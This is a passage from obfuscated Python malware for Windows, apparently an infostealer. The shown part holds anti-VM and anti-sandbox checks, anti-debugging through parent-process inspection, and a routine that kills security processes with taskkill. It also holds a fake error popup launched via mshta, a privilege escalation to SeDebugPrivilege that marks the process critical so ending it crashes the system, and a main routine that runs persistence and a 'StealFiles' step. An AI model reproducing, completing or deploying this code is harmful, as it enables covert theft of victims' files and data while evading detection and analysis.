        OO0OO000O0000000O =O00000O0O00O0O00O .decode (errors ="ignore").split ("\n")#line:2042
        OOO0OO0O0OOOOOO0O =OO0OO000O0000000O [1 ].strip ()#line:2043
        O0000O00OOOO0O000 =os .getenv ("computername")#line:2044
        for O00OO0OOO0OOO0O00 in O0O0O00O00O00O0OO .banned_uuids :#line:2046
            if O00OO0OOO0OOO0O00 in OOO0OO0O0OOOOOO0O :#line:2047
                os ._exit (0 )#line:2048
        for O00O0OO000O0000O0 in O0O0O00O00O00O0OO .banned_computer_names :#line:2050
            if O00O0OO000O0000O0 in O0000O00OOOO0O000 :#line:2051
                os ._exit (0 )#line:2052
    async def kill_process (O0O00O000O0000OO0 )->None :#line:2054
        try :#line:2055
            O0O00OO0OO00OOO00 =await asyncio .create_subprocess_shell ('tasklist',stdout =asyncio .subprocess .PIPE ,stderr =asyncio .subprocess .PIPE ,shell =True )#line:2061
            OO0OOOOO000O00OO0 ,_OOO00OOO00000O0O0 =await O0O00OO0OO00OOO00 .communicate ()#line:2063
            OO0OOOOO000O00OO0 =OO0OOOOO000O00OO0 .decode (errors ="ignore")#line:2064
            for O0OOOOO00O0O0OO0O in O0O00O000O0000OO0 .banned_process :#line:2065
                if O0OOOOO00O0O0OO0O .lower ()in OO0OOOOO000O00OO0 .lower ():#line:2066
                    O0O00OO0OO00OOO00 =await asyncio .create_subprocess_shell (f'taskkill /F /IM "{O0OOOOO00O0O0OO0O}"',stdout =asyncio .subprocess .PIPE ,stderr =asyncio .subprocess .PIPE ,shell =True )#line:2071
                    await O0O00OO0OO00OOO00 .communicate ()#line:2073
        except :#line:2074
            pass #line:2075
class AntiVM :#line:2077
    async def FunctionRunner (O00OOO000OO0000OO )->None :#line:2078
        OOO00OOO00000O00O =[asyncio .create_task (O00OOO000OO0000OO .CheckGpu ()),asyncio .create_task (O00OOO000OO0000OO .CheckHypervisor ()),asyncio .create_task (O00OOO000OO0000OO .CheckHostName ()),asyncio .create_task (O00OOO000OO0000OO .CheckDisk ()),asyncio .create_task (O00OOO000OO0000OO .CheckDLL ()),asyncio .create_task (O00OOO000OO0000OO .CheckGDB ()),asyncio .create_task (O00OOO000OO0000OO .CheckProcess ()),]#line:2086
        O0OO0OOO0O0OO0OOO =await asyncio .gather (*OOO00OOO00000O00O )#line:2087
        if any (O0OO0OOO0O0OO0OOO ):#line:2088
            try :#line:2089
                os .exit (0 )#line:2090
            except :#line:2091
                try :#line:2092
                    os .exit (0 )#line:2093
                except :#line:2094
                    try :#line:2095
                        ctypes .windll .kernel32 .ExitProcess (0 )#line:2096
                    except :#line:2097
                        try :#line:2098
                            exit (0 )#line:2099
                        except :#line:2100
                            pass #line:2101
    async def CheckGpu (OOO0O0OOO0O000O00 )->bool :#line:2102
        try :#line:2103
            OO00OOOO00OOOOOO0 =await asyncio .create_subprocess_shell ('wmic path win32_VideoController get name',stdout =asyncio .subprocess .PIPE ,stderr =asyncio .subprocess .PIPE ,shell =True )#line:2108
            OO000O00OO0000OO0 ,OO00OO0OO0O0O0000 =await OO00OOOO00OOOOOO0 .communicate ()#line:2109
            O0O000000OOO00O0O =OO000O00OO0000OO0 .decode (errors ='ignore').splitlines ()#line:2110
            return any (OOOO00000OO000O00 .lower ()in O0O000000OOO00O0O [2 ].strip ().lower ()for OOOO00000OO000O00 in ("virtualbox","vmware"))#line:2111
        except :#line:2112
            return False #line:2113
    async def CheckHostName (O0OOO0O0OO0OOOO00 )->bool :#line:2114
        try :#line:2115
            O0O0000OO0O0OOO00 =['sandbox','cuckoo','vm','virtual','qemu','vbox','xen']#line:2116
            OOOOOOO0OOOOOOO00 =platform .node ().lower ()#line:2117
            for O00O00OOOO0O00000 in O0O0000OO0O0OOO00 :#line:2118
                if O00O00OOOO0O00000 in OOOOOOO0OOOOOOO00 :#line:2119
                    return True #line:2120
            return False #line:2121
        except :#line:2122
            return False #line:2123
    async def CheckDisk (O00OO00O0O0O000O0 )->bool :#line:2124
        try :#line:2125
            return any ([os .path .isdir (OO00O00OOO00OOOOO )for OO00O00OOO00OOOOO in ('D:\\Tools','D:\\OS2','D:\\NT3X')])#line:2126
        except :#line:2127
            return False #line:2128
    async def CheckDLL (O0OOOO00O0O00O0O0 )->bool :#line:2129
        try :#line:2130
            OOO0O00OO0OO000O0 =ctypes .windll .LoadLibrary ("SbieDll.dll")#line:2131
        except :#line:2132
            return False #line:2133
        else :#line:2134
            return True #line:2135
    async def CheckGDB (OOOOOOOO0OOO0O0O0 )->bool :#line:2136
        try :#line:2137
            O0000O0O0OOO0OOO0 =await asyncio .create_subprocess_shell ("gdb --version",stdout =asyncio .subprocess .PIPE ,stderr =asyncio .subprocess .PIPE ,shell =True )#line:2142
            O000O0000O0OOOOO0 ,O00O0O000000OO0O0 =await O0000O0O0OOO0OOO0 .communicate ()#line:2143
            if b"GDB"in O000O0000O0OOOOO0 :#line:2144
                return True #line:2145
        except :#line:2146
            return False #line:2147
    async def CheckProcess (O00O0O000OO0O0OOO )->bool :#line:2148
        try :#line:2149
            O0OOOO0OOO00O00OO =["vmtoolsd.exe","vmwaretray.exe","vmacthlp.exe","vboxtray.exe","vboxservice.exe","vmsrvc.exe","prl_tools.exe","xenservice.exe",]#line:2159
            OO0O0OO00000OO00O =await asyncio .create_subprocess_shell ("tasklist",stdout =asyncio .subprocess .PIPE ,stderr =asyncio .subprocess .PIPE ,shell =True )#line:2160
            OO0O000OO0OO00O0O ,O00OOOO0O0O0O00O0 =await OO0O0OO00000OO00O .communicate ()#line:2161
            O0000OO0OOOOOOO00 =OO0O000OO0OO00O0O .decode ().lower ()#line:2162
            for OO0O0OO00000OO00O in O0OOOO0OOO00O00OO :#line:2163
                if OO0O0OO00000OO00O in O0000OO0OOOOOOO00 :#line:2164
                    return True #line:2165
            return False #line:2166
        except :#line:2167
            return False #line:2168
    async def CheckHypervisor (O000000O0O00O0OO0 )->bool :#line:2169
        try :#line:2170
            OO0OOOO000O0O0OO0 =await asyncio .create_subprocess_shell ('wmic computersystem get Manufacturer',stdout =asyncio .subprocess .PIPE ,stderr =asyncio .subprocess .PIPE ,shell =True )#line:2176
            O0OOO000O0O0O00OO ,O000OO0OOO0OO000O =await OO0OOOO000O0O0OO0 .communicate ()#line:2177
            OO000O00O00OO000O =await asyncio .create_subprocess_shell ('wmic path Win32_ComputerSystem get Manufacturer',stdout =asyncio .subprocess .PIPE ,stderr =asyncio .subprocess .PIPE ,shell =True )#line:2184
            O0O000O0OOOOO0OO0 ,OOO0O0000O000000O =await OO000O00O00OO000O .communicate ()#line:2185
            if b'VMware'in O0OOO000O0O0O00OO :#line:2188
                return True #line:2189
            elif b"vmware"in O0O000O0OOOOO0OO0 .lower ():#line:2190
                return True #line:2191
        except :#line:2192
            return False #line:2193
async def Fakerror ()->None :#line:2195
    try :#line:2196
        if FakeError [0 ]and not os .path .abspath (sys .argv [0 ])==os .path .join (os .getenv ("LOCALAPPDATA"),"ShittingUpdateService","Shitting.exe"):#line:2197
            O000O0O0000OO0OOO =FakeError [1 ][0 ].replace ("\x22","\\x22").replace ("\x27","\\x22")#line:2198
            OO00OOOO0O0OOO0OO =FakeError [1 ][1 ].replace ("\x22","\\x22").replace ("\x27","\\x22")#line:2199
            O0OOOO0OO00OOO000 ='''mshta "javascript:var sh=new ActiveXObject('WScript.Shell'); sh.Popup('{}', 0, '{}', {}+16);close()"'''.format (OO00OOOO0O0OOO0OO ,O000O0O0000OO0OOO ,FakeError [1 ][2 ])#line:2200
            await asyncio .create_subprocess_shell (O0OOOO0OO00OOO000 ,shell =True )#line:2201
    except :pass #line:2202
def is_runas ():#line:2204
    try :#line:2205
        return ctypes .windll .shell32 .IsUserAnAdmin ()#line:2206
    except Exception :#line:2207
           return False #line:2208
def shitishere ():#line:2210
  try :#line:2211
    return os .path .exists (sys .executable )#line:2212
  except Exception :#line:2213
           pass #line:2214
SE_DEBUG_NAME ="SeDebugPrivilege"#line:2216
SE_PRIVILEGE_ENABLED =0x00000002 #line:2217
class LUID (ctypes .Structure ):#line:2219
    _fields_ =[("LowPart",ctypes .c_uint32 ),("HighPart",ctypes .c_int32 )]#line:2221
class LUIDAndAttributes (ctypes .Structure ):#line:2224
    _fields_ =[("Luid",LUID ),("Attributes",ctypes .c_uint32 )]#line:2226
class TokenPrivileges (ctypes .Structure ):#line:2229
    _fields_ =[("PrivilegeCount",ctypes .c_uint32 ),("Privileges",LUIDAndAttributes *1 )]#line:2231
advapi32 =ctypes .windll .advapi32 #line:2234
ntdll =ctypes .windll .ntdll #line:2235
kernel32 =ctypes .windll .kernel32 #line:2236
def LookupPrivilegeValue (OO0OOOOOO0OO0O0O0 ,O0000000O0O0OO0O0 ,O00OO0O00OO0O000O ):#line:2239
    O000O0OO0OOO00000 =advapi32 .LookupPrivilegeValueW (OO0OOOOOO0OO0O0O0 ,O0000000O0O0OO0O0 ,ctypes .byref (O00OO0O00OO0O000O ))#line:2240
    if O000O0OO0OOO00000 ==0 :#line:2241
        raise ctypes .WinError (ctypes .get_last_error ())#line:2242
    return O000O0OO0OOO00000 #line:2243
def AdjustTokenPrivileges (O0O0OO0O00000O0OO ,OO0O00O0OOOO0O00O ,O0OO0OOOOO00OO0O0 ,O0OOOOO0OO0OO000O ,O0O00O000OOO0OO0O ,OOOO0OO0OO00O0OO0 ):#line:2246
    OOOOO0OOOO0OOO000 =advapi32 .AdjustTokenPrivileges (O0O0OO0O00000O0OO ,OO0O00O0OOOO0O00O ,ctypes .byref (O0OO0OOOOO00OO0O0 ),O0OOOOO0OO0OO000O ,ctypes .byref (O0O00O000OOO0OO0O ),OOOO0OO0OO00O0OO0 )#line:2247
    if OOOOO0OOOO0OOO000 ==0 :#line:2248
        raise ctypes .WinError (ctypes .get_last_error ())#line:2249
    return OOOOO0OOOO0OOO000 #line:2250
def SetDebugPrivilege ():#line:2253
    O0OO0000OO00O0OOO =kernel32 .GetCurrentProcess ()#line:2254
    OO000OOOOOO0O0OOO =ctypes .c_void_p ()#line:2255
    if not kernel32 .OpenProcessToken (O0OO0000OO00O0OOO ,0x0020 |0x0008 ,ctypes .byref (OO000OOOOOO0O0OOO )):#line:2256
        raise ctypes .WinError (ctypes .get_last_error ())#line:2257
    OOOO0O00O00OOO00O =LUID ()#line:2259
    LookupPrivilegeValue (None ,SE_DEBUG_NAME ,OOOO0O00O00OOO00O )#line:2260
    OO0O0OOOO00O0000O =TokenPrivileges ()#line:2262
    OO0O0OOOO00O0000O .PrivilegeCount =1 #line:2263
    OO0O0OOOO00O0000O .Privileges [0 ]=LUIDAndAttributes (OOOO0O00O00OOO00O ,SE_PRIVILEGE_ENABLED )#line:2264
    AdjustTokenPrivileges (OO000OOOOOO0O0OOO ,False ,OO0O0OOOO00O0000O ,ctypes .sizeof (OO0O0OOOO00O0000O ),None ,None )#line:2266
    return OO000OOOOOO0O0OOO #line:2268
def SetProcessCritical ():#line:2271
    SetDebugPrivilege ()#line:2272
    OOO000000O0OOOOOO =ntdll .RtlSetProcessIsCritical (1 ,0 ,0 )#line:2273
    if OOO000000O0OOOOOO !=0 :#line:2274
        return True #line:2275
    else :#line:2276
        raise ctypes .WinError (ctypes .get_last_error ())#line:2277
ntdll =ctypes .windll .ntdll #line:2279
kernel32 =ctypes .windll .kernel32 #line:2280
PROCESS_QUERY_INFORMATION =0x0400 #line:2282
MAX_PATH =260 #line:2283
class ProcessInfo (ctypes .Structure ):#line:2285
    _fields_ =[("Res1",ctypes .c_uint64 ),("PebAddr",ctypes .c_uint64 ),("Res2",ctypes .c_uint64 *2 ),("PID",ctypes .c_uint64 ),("InheritedFromPID",ctypes .c_uint64 )]#line:2290
def NtQueryProc (O0O0O0OOO0O0OOOOO ,OOO00O0O00OOOOO00 ,O00OOOO0O00O000O0 ,O0OOOOO0O00OO000O ):#line:2292
    O00O000OOOO000OO0 =ntdll .NtQueryInformationProcess (O0O0O0OOO0O0OOOOO ,OOO00O0O00OOOOO00 ,ctypes .byref (O00OOOO0O00O000O0 ),O0OOOOO0O00OO000O ,0 )#line:2293
    if O00O000OOOO000OO0 !=0 :#line:2294
        return False #line:2295
    return True #line:2296
def QueryImageName (O0OOO0OOO0OOOO000 ,OO00OO0OOO000OOO0 ,O00000O0O0O0O0OO0 ,O000000OO000OO00O ):#line:2298
    O000000OO000OO00O .value =MAX_PATH #line:2299
    O0O000OOOOOOO00O0 =kernel32 .QueryFullProcessImageNameW (O0OOO0OOO0OOOO000 ,OO00OO0OOO000OOO0 ,O00000O0O0O0O0OO0 ,ctypes .byref (O000000OO000OO00O ))#line:2300
    if O0O000OOOOOOO00O0 ==0 :#line:2301
        return False #line:2302
    return True #line:2303
def CurrentProcName ():#line:2305
    try :#line:2306
        OOOO00OO0O0O0OOO0 =sys .executable #line:2307
        return os .path .basename (OOOO00OO0O0O0OOO0 )#line:2308
    except Exception :#line:2309
        return None #line:2310
def ParentAntiDebug ():#line:2312
    OOOO0OOO00000000O =0 #line:2313
    O000OO00O0OO00O00 =ProcessInfo ()#line:2314
    if not NtQueryProc (kernel32 .GetCurrentProcess (),OOOO0OOO00000000O ,O000OO00O0OO00O00 ,ctypes .sizeof (O000OO00O0OO00O00 )):#line:2316
        return False #line:2317
    OOO0OOO00OOOOOOO0 =ctypes .c_int32 (O000OO00O0OO00O00 .InheritedFromPID ).value #line:2319
    if OOO0OOO00OOOOOOO0 ==0 :#line:2320
        return False #line:2321
    try :#line:2323
        O00O0O0OOO0O0000O =psutil .Process (OOO0OOO00OOOOOOO0 )#line:2324
    except psutil .NoSuchProcess :#line:2325
        return False #line:2326
    try :#line:2328
        O0O00O000OO0OO00O =O00O0O0OOO0O0000O .name ()#line:2329
    except psutil .NoSuchProcess :#line:2330
        return False #line:2331
    if O0O00O000OO0OO00O .lower ()not in ["explorer.exe","cmd.exe"]:#line:2333
        return True #line:2334
    else :#line:2335
        return False #line:2336
if __name__ =='__main__':#line:2338
    try :#line:2339
        security =guardshield .Security ()#line:2340
        if is_runas ()or SetProcessCritical ()or not ParentAntiDebug ()or not security .check_vm ()or not shitishere ()or security .check_debug ()or security .check_sandbox ():#line:2341
            if os .name =="nt":#line:2342
                if not SubModules .create_mutex ("9786 | 5678 | 1234 |"):#line:2343
                    os ._exit (0 )#line:2344
                else :#line:2345
                    start_time =time .time ()#line:2346
                    asyncio .run (AntiVM ().FunctionRunner ())#line:2347
                    asyncio .run (AntiDebug ().FunctionRunner ())#line:2348
                    asyncio .run (Startup ().main ())#line:2349
                    asyncio .run (Fakerror ())#line:2350
                    main_instance =Main ()#line:2351
                    asyncio .run (main_instance .FunctionRunner ())#line:2352
                    asyncio .run (StealCommonFiles ().StealFiles ())#line:2353
            else :#line:2354
                os .exit (0 )#line:2355
        else :#line:2356
            os .exit (0 )#line:2357
    except KeyboardInterrupt :#line:2358
        os ._exit (0 )#line:2359
    except Exception :#line:2360
        pass 